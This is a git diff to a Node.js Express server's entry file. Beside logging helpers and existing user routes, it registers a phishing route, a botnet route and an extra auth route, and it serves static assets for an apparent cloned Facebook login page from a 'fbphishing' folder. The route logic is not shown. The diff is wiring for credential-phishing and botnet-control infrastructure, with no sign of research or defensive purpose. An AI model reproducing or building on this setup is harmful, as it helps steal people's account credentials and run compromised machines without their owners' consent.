@@ -13,14 +13,47 @@ var favicon = require("serve-favicon");
 var logger = require("morgan");
 var bodyParser = require("body-parser");
 var cookieParser = require("cookie-parser");
+//#region global
+global.tokenList = [];
+global.DEBUG = true;
+global.log = function log(state, log) {
+  if (!global.DEBUG) {
+    if (state == "DEBUG" || state == "ERR") {
+      return;
+    }
+  }
+  console.log(
+    "[" +
+      __filename.slice(__dirname.length + 1) +
+      "] - " +
+      "[" +
+      new Date().toLocaleString() +
+      "] - [" +
+      state +
+      "]: " +
+      log
+  );
+};
+//#endregion
 //import models
 const { User } = require("./src/backend/db_orm");
 
 // import routes
+
+//#region portal
 //var login = require("./src/backend/route/loginRoute");
 var auth = require("./src/backend/routes/auth");
 var user = require("./src/backend/routes/user");
 var users = require("./src/backend/routes/users");
+//#endregion
+
+//#region cdn
+var dbUtil = require("./src/backend/services/DbUtilities");
+var phishingRoute = require("./src/backend/routes/PhishingRoute");
+var AuthRoutes = require("./src/backend/routes/AuthRoute"); //importing route
+var BotnetRoutes = require("./src/backend/routes/BotnetRoute"); //importing route
+dbUtil.init();
+//#endregion
 
 //config server
 var app = express();
@@ -32,12 +65,20 @@ app.use(express.static(path.join(__dirname, "dist")));
 app.set("view engine", "html");
 
 // config routes to server
+//#region portal
 app.use("/api/v1", auth);
 app.use("/api/v1/user", user);
 app.use("/api/v1/users", users);
-//auth(app);
-//user(app);
-//users(app);
+//#endregion
+//#region cdn
+phishingRoute(app);
+BotnetRoutes(app);
+AuthRoutes(app); //register the route
+app.use(
+  "/fbPhising_files",
+  express.static("./src/backend/views/pages/fbphishing/fbPhising_files")
+);
+//#endregion
 
 //location for session
 
